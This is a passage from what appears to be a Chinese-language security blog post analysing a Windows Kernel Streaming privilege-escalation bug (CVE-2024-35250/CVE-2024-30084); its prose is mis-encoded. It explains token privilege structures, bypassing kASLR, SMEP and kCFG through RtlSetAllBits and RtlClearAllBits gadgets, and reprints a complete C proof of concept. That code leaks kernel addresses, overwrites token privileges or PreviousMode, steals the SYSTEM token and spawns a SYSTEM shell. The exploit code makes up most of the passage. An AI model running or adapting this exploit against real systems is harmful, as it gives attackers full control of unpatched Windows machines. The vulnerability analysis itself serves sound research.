<span class="title class_">_SID_AND_ATTRIBUTES_HASH</span> RestrictedSidHash;                      <span class="comment">//0x1f8</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION</span>* pSecurityAttributes; <span class="comment">//0x308</span></span><br><span class="line">    VOID* Package;                                                          <span class="comment">//0x310</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SID_AND_ATTRIBUTES</span>* Capabilities;                               <span class="comment">//0x318</span></span><br><span class="line">    ULONG CapabilityCount;                                                  <span class="comment">//0x320</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SID_AND_ATTRIBUTES_HASH</span> CapabilitiesHash;                       <span class="comment">//0x328</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SEP_LOWBOX_NUMBER_ENTRY</span>* LowboxNumberEntry;                     <span class="comment">//0x438</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SEP_CACHED_HANDLES_ENTRY</span>* LowboxHandlesEntry;                   <span class="comment">//0x440</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_AUTHZBASEP_CLAIM_ATTRIBUTES_COLLECTION</span>* pClaimAttributes;       <span class="comment">//0x448</span></span><br><span class="line">    VOID* TrustLevelSid;                                                    <span class="comment">//0x450</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_TOKEN</span>* TrustLinkedToken;                                        <span class="comment">//0x458</span></span><br><span class="line">    VOID* IntegrityLevelSidValue;                                           <span class="comment">//0x460</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SEP_SID_VALUES_BLOCK</span>* TokenSidValues;                           <span class="comment">//0x468</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SEP_LUID_TO_INDEX_MAP_ENTRY</span>* IndexEntry;                        <span class="comment">//0x470</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SEP_TOKEN_DIAG_TRACK_ENTRY</span>* DiagnosticInfo;                     <span class="comment">//0x478</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SEP_CACHED_HANDLES_ENTRY</span>* BnoIsolationHandlesEntry;             <span class="comment">//0x480</span></span><br><span class="line">    VOID* SessionObject;                                                    <span class="comment">//0x488</span></span><br><span class="line">    ULONGLONG VariablePart;                                                 <span class="comment">//0x490</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>å…¶ä¸­</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_SEP_TOKEN_PRIVILEGES</span> Privileges;                                <span class="comment">//0x40</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç»“æ„ä½“æ˜¾ç¤ºäº†å“ªäº›æƒé™disableï¼Œå“ªäº›æƒé™enable</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x18 bytes (sizeof)</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_SEP_TOKEN_PRIVILEGES</span></span><br><span class="line">&#123;</span><br><span class="line">    ULONGLONG Present;                                                      <span class="comment">//0x0</span></span><br><span class="line">    ULONGLONG Enabled;                                                      <span class="comment">//0x8</span></span><br><span class="line">    ULONGLONG EnabledByDefault;                                             <span class="comment">//0x10</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>å°† <em>SYSTEM</em> çš„ Present èµ‹ç»™ ä»»æ„ä¸€ä¸ªè¿›ç¨‹çš„ Present ï¼Œå°±æˆåŠŸ <em>SYSTEM</em> äº†</p><h2 id="bypassä¿æŠ¤æœºåˆ¶"><a href="#bypassä¿æŠ¤æœºåˆ¶" class="headerlink" title="bypassä¿æŠ¤æœºåˆ¶"></a>bypassä¿æŠ¤æœºåˆ¶</h2><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯éœ€è¦bypassä¸€äº›ä¿æŠ¤æœºåˆ¶ï¼škCFGã€kASLRã€SMEP ç­‰ç­‰ä¿æŠ¤</p><p>**å†…æ ¸åœ°å€éšæœºåŒ–(KASLR)**ï¼šWindows å®šä¹‰äº†å››ä¸ªå®Œæ•´æ€§çº§åˆ«ï¼šä½ã€ä¸­ã€é«˜å’ŒSYSTEMï¼Œåœ¨ä¸­ç­‰æ€§å®Œæ•´åº¦çº§åˆ«ä¸‹ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨ä¼—æ‰€å‘¨çŸ¥çš„<a href="https://docs.microsoft.com/en-us/windows/desktop/api/psapi/nf-psapi-enumdevicedrivers">EnumDeviceDrivers</a>å’Œ<a href="https://docs.microsoft.com/en-us/windows/desktop/api/winternl/nf-winternl-ntquerysysteminformation">NtQuerySystemInformation</a> APIï¼Œè½»æ˜“é¥¶è¿‡KASLR</p><p><strong>SMEP</strong>ï¼šä¸å…è®¸ring0æ‰§è¡Œring3çš„ä»£ç ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ä½¿ç”¨å†…æ ¸æ¨¡å¼ROP gadgetåœ¨å†…æ ¸ä¸­æ‰§è¡Œ æˆ–è€… å°†shellcodeçš„æŒ‡é’ˆä¼ å…¥å†…æ ¸æ¨¡å¼ä¸­ï¼Œç„¶åå†…æ ¸åœ¨å†…æ ¸çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œç”¨æˆ·æ¨¡å¼çš„ä»£ç ï¼ˆshellcodeï¼‰</p><p>å› æ­¤åœ¨ä¸­ç­‰æ€§å®Œæ•´åº¦çº§åˆ«ä¸‹ï¼ˆring2ï¼‰ï¼Œæœ€éœ€è¦è€ƒè™‘çš„æ˜¯<strong>kCFG</strong></p><p>kCFG ä¸­åˆæ³•çš„function åç§°æœ‰set çš„functionï¼Œæ¯”è¾ƒå¯èƒ½æ˜¯å¯ä»¥å†™å…¥çš„ã€‚æˆ‘ä»¬è¿™é‡Œæ˜¯ç›´æ¥æ‹¿ntoskrnl.exe ä¸­ export fucntion å»å¯»æ‰¾çœ‹çœ‹æ˜¯å¦æœ‰åˆæ³•çš„functionï¼Œè¿™äº›å¤§å¤šæƒ…å†µä¸‹éƒ½æ˜¯åˆæ³•çš„ã€‚</p><p>åœ¨ntoskrnl.exeä¸‹çš„RtlSetAllBitså‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __stdcall <span class="title">RtlSetAllBits</span><span class="params">(PRTL_BITMAP BitMapHeader)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *Buffer; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  Buffer = BitMapHeader-&gt;Buffer;</span><br><span class="line">  v2 = (<span class="type">unsigned</span> __int64)(<span class="number">4</span> * (((BitMapHeader-&gt;SizeOfBitMap &amp; <span class="number">0x1F</span>) != <span class="number">0</span>) + (BitMapHeader-&gt;SizeOfBitMap &gt;&gt; <span class="number">5</span>))) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="type">unsigned</span> __int8)Buffer &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *Buffer = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !--v2 )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      ++Buffer;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(Buffer, <span class="number">0xFF</span>u, <span class="number">8</span> * (v2 &gt;&gt; <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> ( (v2 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      Buffer[v2 - <span class="number">1</span>] = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ƒæ˜¯ä¸ªéå¸¸å¥½ç”¨çš„gadget è€Œä¸”æ˜¯kCFG ä¸­åˆæ³•çš„functionï¼Œå¦å¤–ä¹Ÿåªè¦æ§åˆ¶ä¸€ä¸ªå‚æ•°<code>_RTL_BITMAP</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">RTL_BITMAP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG SizeOfBitMap;                                               </span><br><span class="line">    ULONG* Buffer;                                                   </span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯å°†Buffer æŒ‡å®šåˆ°ä»»æ„ä½ç½®å¹¶æŒ‡å®šå¤§å°ï¼Œå°±å¯ä»¥å°†ä¸€æ®µèŒƒå›´çš„bits å…¨éƒ¨è®¾ç½®èµ·æ¥ï¼Œåˆ°è¿™è¾¹å°±å·®ä¸å¤šç»“æŸäº†ï¼Œåªè¦å°†<code>Token-&gt;Privilege</code>å…¨éƒ¨è®¾ç½®èµ·æ¥ï¼Œå°±å¯ä»¥åˆ©ç”¨Abuse Privilege æ–¹æ³•æ¥åšåˆ°EoP äº†</p><p>ä¸‹è¿°PoCä¸­è¿˜æœ‰ä¸€ç§åˆ©ç”¨æ–¹å¼ï¼Œé¦–å…ˆåˆ©ç”¨<code>RtlClearAllBits</code>å°†å½“å‰çº¿ç¨‹çš„<code>PreviousMode</code>è®¾ç½®ä¸º<code>KernelMode</code>ï¼Œç„¶ååˆ©ç”¨ä»»æ„å†™çš„èƒ½åŠ›ï¼Œç›´æ¥æ›¿æ¢å½“å‰è¿›ç¨‹çš„TOKENä¸ºSystemè¿›ç¨‹çš„TOKENï¼Œè¾¾åˆ°ææƒçš„ç›®çš„</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>ç½‘ä¸Šå·²ç»æœ‰äº†å…¬å¼€çš„pocï¼Œè®©æˆ‘ä»¬åˆ†æä¸€æ‰‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">PoC Info</span></span><br><span class="line"><span class="comment">--------------------------------------------------------------</span></span><br><span class="line"><span class="comment">Vulnerability:        CVE-2024-35250/CVE-2024-30084</span></span><br><span class="line"><span class="comment">Tested environment:    Windows 11 22h2 Build 22621</span></span><br><span class="line"><span class="comment">Windows 10 20h2 Build 19042</span></span><br><span class="line"><span class="comment">VMWare Workstation 17 Pro</span></span><br><span class="line"><span class="comment">Weakness:        CWE-822: Untrusted Pointer Dereference</span></span><br><span class="line"><span class="comment">Required privileges:    Medium IL</span></span><br><span class="line"><span class="comment">--------------------------------------------------------------</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __STREAMS__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _INC_MMREG</span></span><br><span class="line"><span class="comment">//#define _SEP_TOKEN_PRIVILEGES0xc1b4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _PREVIOUS_MODE0xbaba</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;common.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Ksproxy.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ksuser.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ntdllp.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;SetupAPI.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Advapi32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line">BOOL res = FALSE;</span><br><span class="line">NTSTATUS status = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint32_t</span> Ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">hDevice = <span class="built_in">GetKsDevice</span>(KSCATEGORY_DRM_DESCRAMBLE);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _SEP_TOKEN_PRIVILEGES</span></span><br><span class="line"></span><br><span class="line">HANDLE hToken;</span><br><span class="line"><span class="type">uint64_t</span> ktoken_obj = <span class="number">0</span>;</span><br><span class="line">res = <span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ALL_ACCESS, &amp;hToken);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!res)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open current process token\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = <span class="built_in">GetObjPtr</span>(&amp;ktoken_obj, <span class="built_in">GetCurrentProcessId</span>(), hToken);</span><br><span class="line"><span class="keyword">if</span> (res != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Current process TOKEN address = %llx\n&quot;</span>, ktoken_obj);</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined _PREVIOUS_MODE</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> Sysproc = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> Curproc = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> Curthread = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">HANDLE hCurproc = <span class="number">0</span>;</span><br><span class="line">HANDLE hThread = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Leak System _EPROCESS kernel address</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">Ret = <span class="built_in">GetObjPtr</span>(&amp;Sysproc, <span class="number">4</span>, (HANDLE)<span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span> (Ret != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] System EPROCESS address: %llx\n&quot;</span>, Sysproc);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Leak Current _KTHREAD kernel address</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">hThread = <span class="built_in">OpenThread</span>(THREAD_QUERY_INFORMATION, TRUE, <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line"><span class="keyword">if</span> (hThread != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">Ret = <span class="built_in">GetObjPtr</span>(&amp;Curthread, <span class="built_in">GetCurrentProcessId</span>(), hThread);</span><br><span class="line"><span class="keyword">if</span> (Ret != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Current KTHREAD address: %llx\n&quot;</span>, Curthread);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Leak Current _EPROCESS kernel address</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">hCurproc = <span class="built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION, TRUE, <span class="built_in">GetCurrentProcessId</span>());</span><br><span class="line"><span class="keyword">if</span> (hCurproc != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">Ret = <span class="built_in">GetObjPtr</span>(&amp;Curproc, <span class="built_in">GetCurrentProcessId</span>(), hCurproc);</span><br><span class="line"><span class="keyword">if</span> (Ret != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Current EPROCESS address: %llx\n&quot;</span>, Curproc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Initialize input buffer</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">pInBufProperty-&gt;Set = KSPROPSETID_DrmAudioStream;</span><br><span class="line">pInBufProperty-&gt;Flags = KSPROPERTY_TYPE_UNSERIALIZESET;</span><br><span class="line">pInBufProperty-&gt;Id = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Initialize output buffer</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">pSerialHdr-&gt;PropertySet = KSPROPSETID_DrmAudioStream;</span><br><span class="line"></span><br><span class="line">pSerialHdr-&gt;Count = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">pSerial-&gt;PropertyLength = <span class="built_in">sizeof</span>(EXPLOIT_DATA1);</span><br><span class="line">pSerial-&gt;Id = <span class="number">0x0</span>;                <span class="comment">// Should be null</span></span><br><span class="line">pSerial-&gt;PropTypeSet.Set = KSPROPSETID_DrmAudioStream;</span><br><span class="line">pSerial-&gt;PropTypeSet.Flags = <span class="number">0x0</span>; <span class="comment">// Should be null</span></span><br><span class="line">pSerial-&gt;PropTypeSet.Id = <span class="number">0x45</span>;   <span class="comment">// Irrelevant value</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Intialize fake property data</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">uint64_t</span> ntoskrnl_user_base = <span class="number">0</span>;</span><br><span class="line">HMODULE outModule = <span class="number">0</span>;</span><br><span class="line">UINT_PTR ntoskrnlBase = <span class="built_in">GetKernelModuleAddress</span>(<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] ntoskrnl.exe base address = %llx\n&quot;</span>, ntoskrnlBase);</span><br><span class="line">pOutBufPropertyData-&gt;FakeBitmap = (PRTL_BITMAP)<span class="built_in">AllocateBitmap</span>(<span class="built_in">sizeof</span>(RTL_BITMAP), <span class="built_in">Ptr64</span>(<span class="number">0x10000000</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _SEP_TOKEN_PRIVILEGES</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// FakeBitmap initialization for the overwriting TOKEN.Privileges fields technique</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// It should be (0x20 * n) to overwrite (n/2 * 0x8) bytes at arbitrary address</span></span><br><span class="line">pOutBufPropertyData-&gt;FakeBitmap-&gt;SizeOfBitMap = <span class="number">0x20</span> * <span class="number">4</span>;</span><br><span class="line">pOutBufPropertyData-&gt;FakeBitmap-&gt;Buffer = <span class="built_in">Ptr64</span>(ktoken_obj + TOKEN_PRIV_WIN_11_22H2_22621);</span><br><span class="line">pInBufPropertyData-&gt;ptr_ArbitraryFunCall = <span class="built_in">Ptr64</span>(<span class="built_in">leak_gadget_address</span>(<span class="string">&quot;RtlSetAllBits&quot;</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] RtlSetAllBits kernel address = %p\n&quot;</span>, pInBufPropertyData-&gt;ptr_ArbitraryFunCall);</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined _PREVIOUS_MODE</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// FakeBitmap initialization for the overwriting KTHREAD.PreviousMode field technique</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">pOutBufPropertyData-&gt;FakeBitmap-&gt;SizeOfBitMap = <span class="number">0x20</span>;</span><br><span class="line">pOutBufPropertyData-&gt;FakeBitmap-&gt;Buffer = <span class="built_in">Ptr64</span>(Curthread + PREV_MODE_WIN_11_22H2_22621);</span><br><span class="line">pInBufPropertyData-&gt;ptr_ArbitraryFunCall = <span class="built_in">Ptr64</span>(<span class="built_in">leak_gadget_address</span>(<span class="string">&quot;RtlClearAllBits&quot;</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] RtlClearAllBits kernel address = %p\n&quot;</span>, pInBufPropertyData-&gt;ptr_ArbitraryFunCall);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Send property request to trigger the vulnerability</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">res = <span class="built_in">SendIoctlReq</span>(hDevice);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!res)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] SendIoctlReq failed\n&quot;</span>); <span class="comment">// It&#x27;s ok to see this message if exploit succeded</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _SEP_TOKEN_PRIVILEGES</span></span><br><span class="line"></span><br><span class="line">HANDLE hWinLogon = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, <span class="built_in">GetPidByName</span>(<span class="string">L&quot;winlogon.exe&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!hWinLogon)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] OpenProcess failed with error = %lx\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CreateProcessFromHandle</span>(hWinLogon, (LPSTR)<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined _PREVIOUS_MODE</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Leveraging DKOM to achieve LPE\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Calling Write64 wrapper to overwrite current EPROCESS-&gt;Token\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">KPROCESSOR_MODE mode = UserMode; <span class="comment">// We set UserMode in restoring thread state phase to avoid BSOD in further process creations</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Write64</span>(<span class="built_in">Ptr64</span>(Curproc + EPROCESS_TOKEN_WIN_11_22H2_22621), <span class="built_in">Ptr64</span>(Sysproc + EPROCESS_TOKEN_WIN_11_22H2_22621), TOKEN_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Restoring KTHREAD.PreviousMode phase</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="built_in">Write64</span>(<span class="built_in">Ptr64</span>(Curthread + PREV_MODE_WIN_11_22H2_22621), &amp;mode, <span class="built_in">sizeof</span>(mode));</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Spawn the shell with &quot;nt authority\system&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PoCæ‰§è¡Œæµç¨‹çš„è¯¦ç»†åˆ†æ"><a href="#PoCæ‰§è¡Œæµç¨‹çš„è¯¦ç»†åˆ†æ" class="headerlink" title="PoCæ‰§è¡Œæµç¨‹çš„è¯¦ç»†åˆ†æ"></a>PoCæ‰§è¡Œæµç¨‹çš„è¯¦ç»†åˆ†æ</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span 